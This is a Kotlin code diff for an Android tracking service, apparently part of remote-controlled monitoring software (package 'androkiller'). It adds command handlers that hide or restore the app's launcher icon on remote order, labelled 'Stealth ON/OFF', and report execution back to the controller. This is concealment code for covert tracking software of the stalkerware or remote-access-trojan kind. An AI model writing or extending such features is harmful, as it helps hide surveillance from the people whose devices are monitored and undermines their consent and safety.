@@ -576,6 +576,22 @@ class TrackerForegroundService : Service() {
                             }
                         }
                     }
+                    "TOGGLE_STEALTH", "TOGGLE_ICON" -> {
+                        val isHidden = com.nexus.androkiller.util.LauncherVisibility.toggleLauncherIcon(this@TrackerForegroundService)
+                        val msg = if (isHidden) "Launcher icon hidden (Stealth ON)" else "Launcher icon visible (Stealth OFF)"
+                        repository.markCommandExecuted(command.commandId, "EXECUTED", msg)
+                        Log.i(TAG, "Command TOGGLE_STEALTH processed: isHidden=$isHidden")
+                    }
+                    "HIDE_ICON", "ENABLE_STEALTH" -> {
+                        val success = com.nexus.androkiller.util.LauncherVisibility.hideLauncherIcon(this@TrackerForegroundService)
+                        repository.markCommandExecuted(command.commandId, if (success) "EXECUTED" else "FAILED", "Launcher icon hidden (Stealth ON)")
+                        Log.i(TAG, "Command HIDE_ICON processed: success=$success")
+                    }
+                    "SHOW_ICON", "DISABLE_STEALTH" -> {
+                        val success = com.nexus.androkiller.util.LauncherVisibility.showLauncherIcon(this@TrackerForegroundService)
+                        repository.markCommandExecuted(command.commandId, if (success) "EXECUTED" else "FAILED", "Launcher icon restored (Stealth OFF)")
+                        Log.i(TAG, "Command SHOW_ICON processed: success=$success")
+                    }
                     else -> {
                         repository.markCommandExecuted(command.commandId, "FAILED", "Unknown action ${command.action}")
                     }
